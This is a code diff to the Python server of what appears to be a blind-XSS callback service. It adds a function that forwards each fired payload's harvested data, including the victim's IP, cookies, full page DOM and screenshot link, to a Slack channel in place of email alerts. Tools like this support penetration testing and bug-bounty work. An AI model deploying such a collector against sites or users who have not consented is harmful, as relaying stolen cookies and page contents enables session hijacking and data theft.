@@ -25,6 +25,7 @@ from models.injection_record import Injection
 from models.request_record import InjectionRequest
 from models.collected_page import CollectedPage
 from binascii import a2b_base64
+from slacker import Slacker
 
 logging.basicConfig(filename="logs/detailed.log",level=logging.DEBUG)
 
@@ -143,6 +144,33 @@ class BaseHandler(tornado.web.RequestHandler):
         domain_parts = domain.split( "." + settings["domain"] )
         subdomain = domain_parts[0]
         return session.query( User ).filter_by( domain=subdomain ).first()
+
+def send_slack(injection_db_record,pgp=False):
+    slack = Slacker(settings['slack_api_key'])
+    slack_send_to = settings['slack_send_to']
+
+    ## decode/template message (or not)
+    if pgp:
+      slack_message = '*XSS Payload PGP Encrypted message received*\n\n'+injection_db_record
+    else:
+      injection_data = injection_db_record.get_injection_blob()
+      slack_message = '*XSS Payload Fired On* ' + injection_data['vulnerable_page'] + '\n\t*IP:* ' + injection_data['victim_ip']
+      if injection_data['referer']:
+        slack_message = slack_message + '\n\t*Referer:* '+ injection_data['referer']
+      slack_message = slack_message + '\n\t*User Agent:* ' + injection_data['user_agent']
+      if injection_data['cookies']:
+        slack_message = slack_message + '\n\t*Cookies:* ' + injection_data['cookies']
+      slack_message = slack_message + '\n\t*DOM:*\n```' + injection_data['dom'] + '```'
+      slack_message = slack_message + '\n\t*Origin:* ' + injection_data['origin']
+      slack_message = slack_message + '\n\t*Screenshot:* https://' + settings['domain'] + '/' + injection_data['screenshot']
+
+    ## post message
+    if slack_send_to[0] == '#':
+      slack.chat.post_message(slack_send_to, slack_message)
+    elif slack_send_to[0] == '@':
+      slack.chat.post_message(slack_send_to, slack_message, as_user=True)
+    else:
+      slack.chat.post_message('#general', slack_message)
 
 def data_uri_to_file( data_uri ):
     """
@@ -405,7 +433,8 @@ class CallbackHandler(BaseHandler):
         if "-----BEGIN PGP MESSAGE-----" in self.request.body:
             if owner_user.email_enabled:
                 self.logit( "User " + owner_user.username + " just got a PGP encrypted XSS callback, passing it along." )
-                send_javascript_pgp_encrypted_callback_message( self.request.body, owner_user.email )
+                #send_javascript_pgp_encrypted_callback_message( self.request.body, owner_user.email )
+                send_slack(self.request.body,True)
         else:
             callback_data = json.loads( self.request.body )
             callback_data['ip'] = self.request.remote_ip
@@ -417,9 +446,10 @@ class CallbackHandler(BaseHandler):
             else:
                 injection_db_record = record_callback_in_database( callback_data, self )
                 self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
-
-                if owner_user.email_enabled:
-                    send_javascript_callback_message( owner_user.email, injection_db_record )
+                send_slack(injection_db_record)
+                ## disabling mailgun here at the moment :p sorry <3 
+                #if owner_user.email_enabled:
+                #    send_javascript_callback_message( owner_user.email, injection_db_record )
                 self.write( '{}' )
 
 class HomepageHandler(BaseHandler):
@@ -497,7 +527,8 @@ class ResendInjectionEmailHandler(BaseHandler):
 
         self.logit( "User just requested to resend the injection record email for URI " + injection_db_record.vulnerable_page )
 
-        send_javascript_callback_message( user.email, injection_db_record )
+        #send_javascript_callback_message( user.email, injection_db_record )
+        send_slack(injection_db_record)
 
         self.write({
             "success": True,
